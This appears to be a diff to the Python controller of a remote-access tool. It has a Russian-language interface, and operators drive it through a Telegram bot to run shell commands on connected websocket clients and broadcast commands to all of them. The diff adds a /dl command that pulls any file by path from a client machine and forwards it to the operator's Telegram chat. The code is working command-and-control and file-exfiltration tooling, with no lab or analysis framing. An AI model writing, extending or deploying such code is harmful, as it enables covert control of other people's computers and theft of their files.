@@ -6,7 +6,8 @@ import sys
 from datetime import datetime
 
 from aiohttp import web, WSMsgType
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from io import BytesIO
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
 from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
 
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
@@ -84,12 +85,39 @@ async def ws_handler(request):
     clients[client_id]["flush_task"] = flush_task
 
     try:
-        async for msg in ws:
-            if msg.type == WSMsgType.TEXT:
-                cl = clients.get(client_id)
-                if cl:
-                    cl["buffer"] += msg.data
-            elif msg.type == WSMsgType.ERROR:
+        while True:
+            try:
+                msg = await asyncio.wait_for(ws.receive(), timeout=120)
+            except asyncio.TimeoutError:
+                try:
+                    await ws.ping()
+                except:
+                    break
+                continue
+            if msg.type == WSMsgType.BINARY:
+                dl = clients.get(client_id, {}).pop("pending_dl", None)
+                if dl:
+                    await send_to_telegram(
+                        dl["chat_id"],
+                        f"📥 Файл `{dl['path']}` ({len(msg.data)} байт)",
+                        parse_mode="Markdown",
+                    )
+                    await bot_app.bot.send_document(
+                        chat_id=dl["chat_id"],
+                        document=InputFile(BytesIO(msg.data), filename=os.path.basename(dl["path"])),
+                    )
+            elif msg.type == WSMsgType.TEXT:
+                text = msg.data
+                if text.startswith("__FILE_ERROR__ "):
+                    dl = clients.get(client_id, {}).pop("pending_dl", None)
+                    if dl:
+                        err = text[len("__FILE_ERROR__ "):]
+                        await send_to_telegram(dl["chat_id"], f"❌ `{err}`", parse_mode="Markdown")
+                else:
+                    cl = clients.get(client_id)
+                    if cl:
+                        cl["buffer"] += text
+            elif msg.type in (WSMsgType.CLOSE, WSMsgType.ERROR):
                 break
     except Exception:
         pass
@@ -144,6 +172,7 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"/shell - Интерактивный режим\n"
         f"/back - Выйти из интерактива\n"
         f"/exec <cmd> - Выполнить команду\n"
+        f"/dl <путь> - Скачать файл\n"
         f"/info - Инфо о клиенте\n"
         f"/broadcast <cmd> - Всем клиентам\n"
         f"/help - Справка\n\n"
@@ -165,7 +194,8 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "**Работа:**\n"
         "\u2022 `/shell` - Войти в интерактив\n"
         "\u2022 `/back` - Выйти из интерактива\n"
-        "\u2022 `/exec <cmd>` - Выполнить команду\n\n"
+        "\u2022 `/exec <cmd>` - Выполнить команду\n"
+        "\u2022 `/dl <путь>` - Скачать файл с клиента\n\n"
         "**Дополнительно:**\n"
         "\u2022 `/broadcast <cmd>` - Всем клиентам\n\n"
         "**Пример:**\n"
@@ -276,6 +306,27 @@ async def exec_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("\u274c Ошибка отправки команды")
 
 
+async def dl_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    uid = update.effective_user.id
+    if uid not in ALLOWED_USERS:
+        return
+    if not current_client or current_client not in clients:
+        await update.message.reply_text("❌ Нет выбранного клиента")
+        return
+    if not context.args:
+        await update.message.reply_text("❌ Использование: `/dl <путь>`", parse_mode="Markdown")
+        return
+    path = " ".join(context.args)
+    cl = clients[current_client]
+    cl["pending_dl"] = {"chat_id": uid, "path": path}
+    try:
+        await cl["ws"].send_str(f"__FILE__ {path}")
+        await update.message.reply_text(f"📥 Загружаю `{path}`...", parse_mode="Markdown")
+    except Exception:
+        cl.pop("pending_dl", None)
+        await update.message.reply_text("❌ Ошибка отправки команды")
+
+
 async def broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
     if uid not in ALLOWED_USERS:
@@ -350,6 +401,8 @@ async def run_telegram_bot():
     app.add_handler(CommandHandler("shell", shell_command))
     app.add_handler(CommandHandler("back", back_command))
     app.add_handler(CommandHandler("exec", exec_command))
+    app.add_handler(CommandHandler("dl", dl_command))
+    app.add_handler(CommandHandler("download", dl_command))
     app.add_handler(CommandHandler("broadcast", broadcast_command))
     app.add_handler(CallbackQueryHandler(button_callback))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
